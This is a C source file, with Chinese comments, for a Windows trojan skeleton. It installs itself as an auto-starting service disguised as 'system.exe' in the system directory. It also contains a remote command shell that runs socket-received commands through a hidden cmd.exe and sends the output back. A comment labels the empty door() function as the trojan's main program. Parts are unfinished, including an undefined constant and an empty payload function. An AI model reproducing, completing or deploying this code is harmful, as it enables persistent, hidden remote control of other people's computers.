//xm: 通过服务启动一段程序, 由socket进行和远端的通信和控制

#include <stdio.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")              
void  WINAPI ServiceMain(DWORD,LPTSTR *);
//DWORD WINAPI CmdService(LPVOID);
//DWORD WINAPI CmdShell(LPVOID);
void WINAPI ServiceCtrlHandler(DWORD Opcode);//服务控制函数
BOOL  InstallCmdService();
void DelServices();
void  door();
//VOID WINAPI EXEBackMain (LPVOID s);
SERVICE_STATUS m_ServiceStatus;
SERVICE_STATUS_HANDLE m_ServiceStatusHandle;
BOOL bRunning=true;

int main(int argc,char *argv[])
{
   	SERVICE_TABLE_ENTRY DispatchTable[] =
	{
		{"system",ServiceMain},//服务程序的名称和入口点(函数)
		{NULL    ,NULL    }//SERVICE_TABLE_ENTRY结构必须以“NULL”结束；
	};
  //  if(argc==1) door();
	if(argc==2) //两个参数，第一个参数是程序本身，第二个是自己输入的。
	{
		if(!stricmp(argv[1],"-i"))//如果第二个参数等于-install
		{
			InstallCmdService();
		}
		else if(!stricmp(argv[1],"-r"))//比较字符串s1和s2，但不区分字母的大小写
		{
			DelServices();
		}
		
		return 0;
	}


	StartServiceCtrlDispatcher(DispatchTable);//把入口点的地址传入

	return 0;
}

void door ()
{
  
//木马主程序
}

void WINAPI ServiceMain(DWORD dwArgc,LPTSTR *lpArgv) //服务主函数

{
    m_ServiceStatus.dwServiceType = SERVICE_WIN32;
	m_ServiceStatus.dwCurrentState = SERVICE_START_PENDING; 
	m_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE;;
	m_ServiceStatus.dwWin32ExitCode = 0; 
	m_ServiceStatus.dwServiceSpecificExitCode = 0; 
	m_ServiceStatus.dwCheckPoint = 0; 
	m_ServiceStatus.dwWaitHint = 0;
	m_ServiceStatusHandle = RegisterServiceCtrlHandler("system",ServiceCtrlHandler);
	if (m_ServiceStatusHandle == (SERVICE_STATUS_HANDLE)0)return; 
	m_ServiceStatus.dwCurrentState = SERVICE_RUNNING; //设置服务状态
	m_ServiceStatus.dwCheckPoint = 0; 
	m_ServiceStatus.dwWaitHint = 0; 
	//SERVICE_STATUS结构含有七个成员，它们反映服务的现行状态。
	//所有这些成员必须在这个结构被传递到SetServiceStatus之前正确的设置
   if( SetServiceStatus (m_ServiceStatusHandle, &m_ServiceStatus))
 	bRunning=true;
	door(); //启动我们的服务程序
	return; 
}

void WINAPI ServiceCtrlHandler(DWORD Opcode)//服务控制函数
{
	switch(Opcode) 
	{ 
	case SERVICE_CONTROL_PAUSE:    // we accept the command to pause it
		m_ServiceStatus.dwCurrentState = SERVICE_PAUSED; 
		break; 
	case SERVICE_CONTROL_CONTINUE:  // we got the command to continue
		m_ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
		break; 
	case SERVICE_CONTROL_STOP:   // we got the command to stop this service
		m_ServiceStatus.dwWin32ExitCode = 0; 
		m_ServiceStatus.dwCurrentState = SERVICE_STOPPED; 
		m_ServiceStatus.dwCheckPoint = 0; 
		m_ServiceStatus.dwWaitHint = 0; 
		SetServiceStatus (m_ServiceStatusHandle,&m_ServiceStatus);
		bRunning=false;
		break;
	case SERVICE_CONTROL_INTERROGATE: 
		break; 
	} 
	return; 
}

BOOL InstallCmdService()//安装服务函数
{
	char strDir[1024];
	SC_HANDLE schSCManager,schService;
	GetCurrentDirectory(1024,strDir);//取当前目录
	GetModuleFileName(NULL,strDir,sizeof(strDir));//取当前文件路径和文件名

	char chSysPath[1024];
	GetSystemDirectory(chSysPath,sizeof(chSysPath));//取系统目录

	strcat(chSysPath,"\\system.exe");//将scvhost.exe拼接到系统目录
	if(CopyFile(strDir,chSysPath,FALSE))printf("Copy file OK\n"); // 把当前服务程序复制到系统根目录为system.exe

	strcpy(strDir,chSysPath);
	
	schSCManager = OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS); 
	if (schSCManager == NULL) 
	{
		printf("open scmanger failed,maybe you do not have the privilage to do this\n");
		return false;
	}

	LPCTSTR lpszBinaryPathName=strDir;
	schService = CreateService(schSCManager,
		"system",
		"system", //将服务的信息添加到SCM的数据库
		SERVICE_ALL_ACCESS, // desired access 
		SERVICE_WIN32_OWN_PROCESS, // service type 
		SERVICE_AUTO_START, // start type 
		SERVICE_ERROR_NORMAL, // error control type 
		lpszBinaryPathName, // service's binary 
		NULL, // no load ordering group 
		NULL, // no tag identifier 
		NULL, // no dependencies 
		NULL, // LocalSystem account 
		NULL); // no password 
        
		if (schService) printf("Install Service Success!\n");
		else
		return false; 
		
	CloseServiceHandle(schService); 
	return true;
}

void DelServices()
{
    char name[100];
    SC_HANDLE scm;
    SC_HANDLE service;
    SERVICE_STATUS status;
	strcpy(name,"system");

    if((scm=OpenSCManager(NULL,NULL,SC_MANAGER_CREATE_SERVICE))==NULL)
    {
        printf("OpenSCManager Error ");
    }
    service=OpenService(scm,name,SERVICE_ALL_ACCESS|DELETE);
    if (!service)
    {
        printf("OpenService error! ");
        return;
    }
    BOOL isSuccess=QueryServiceStatus(service,&status);
    if (!isSuccess)
    {
        printf("QueryServiceStatus error! ");
        return;
    }

    if ( status.dwCurrentState!=SERVICE_STOPPED )
    {

        isSuccess=ControlService(service,SERVICE_CONTROL_STOP,&status);
        if (!isSuccess )
            printf("Stop Service error! ");
        Sleep( 500 );

    }

    isSuccess=DeleteService(service);
    if (!isSuccess)
         printf("Delete Service Fail!");
    else
         printf("Delete Service Success! ");

    CloseServiceHandle(service );
    CloseServiceHandle(scm);
}

VOID WINAPI EXEBackMain (LPVOID s)
//BOOL EXEBackMain (SOCKET sock)
{    
    SOCKET sock=(SOCKET)s;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    HANDLE hRead=NULL,hWrite=NULL;
    TCHAR CmdSign[]="\nGood Luck!:\\>";
    
    while (TRUE)
    {
           TCHAR MsgError[50]={0};     //错误消息缓冲
           TCHAR Cmdline[300]={0};     //命令行缓冲
           TCHAR RecvBuf[1024]={0};    //接收缓冲
           TCHAR SendBuf[2048]={0};    //发送缓冲
           SECURITY_ATTRIBUTES sa;
           DWORD bytesRead=0;
           int ret=0;

           sa.nLength=sizeof(SECURITY_ATTRIBUTES);
           sa.lpSecurityDescriptor=NULL;
           sa.bInheritHandle=TRUE;

           //创建匿名管道
           if (!CreatePipe(&hRead,&hWrite,&sa,0))
           {
               goto Clean;
           }

           si.cb=sizeof(STARTUPINFO);
		   //GetStartupInfo():Retrieves the contents of the STARTUPINFO structure that was specified when the calling process was created.
           GetStartupInfo(&si);
           si.hStdError=hWrite;
           si.hStdOutput=hWrite;    //进程（cmd）的输出写入管道
           si.wShowWindow=SW_HIDE;
           si.dwFlags=STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;

           GetSystemDirectory(Cmdline,sizeof (Cmdline));   //获取系统目录
           strcat(Cmdline,"\\cmd.exe /c ");                //拼接cmd

          // ret=send(sock,CmdSign,sizeof (CmdSign),0);      //向目标发送提示符

           if (ret==SOCKET_ERROR)
           {
              goto Clean;
           }
           
           ret=recv(sock,RecvBuf,sizeof (RecvBuf),0);       //接收目标数据
		   
           //如果为exit或quit，就退出
           if (strnicmp(RecvBuf,"exit",4)==0||strnicmp(RecvBuf,"quit",4)==0)
           {
               send(sock,BYEBYE,sizeof (BYEBYE),0);
               goto Clean;
           }
		
           //表示对方已经断开
           if (ret==SOCKET_ERROR)
           {
               goto Clean;
           }

           //表示接收数据出错
           if (ret<=0)
           {
               #ifdef DEBUGMSG
                      sprintf(MsgError,"recv() GetLastError reports %d\n",WSAerron);
                      send(sock,MsgError,sizeof (MsgError),0);
               #endif      
               continue;
           }

           Sleep(100);      //休息一下，可要可不要
           strncat(Cmdline,RecvBuf,sizeof (RecvBuf));  //拼接一条完整的cmd命令

           //创建进程，也就是执行cmd命令
           if (!CreateProcess(NULL,Cmdline,NULL,NULL,TRUE,NULL,NULL,NULL,&si,&pi))
           {
              continue;
           }
           CloseHandle(hWrite);
           while (TRUE)
           {
                  //无限循环读取管道中的数据，直到管道中没有数据为止
                  if (ReadFile(hRead,SendBuf,sizeof (SendBuf),&bytesRead,NULL)==0)
                      break;
                  send(sock,SendBuf,bytesRead,0);      //发送出去
                  memset(SendBuf,0,sizeof (SendBuf));  //缓冲清零
                  Sleep(100);                          //休息一下
           }
          
    }

    Clean:
          //释放句柄
          if (hRead!=NULL)
              CloseHandle(hRead);

          if (hWrite!=NULL)
              CloseHandle(hWrite);

          //释放SOCKET
          if (sock!=NULL)
              closesocket(sock);

          WSACleanup();
          ExitThread(0);
          //return 0;

}

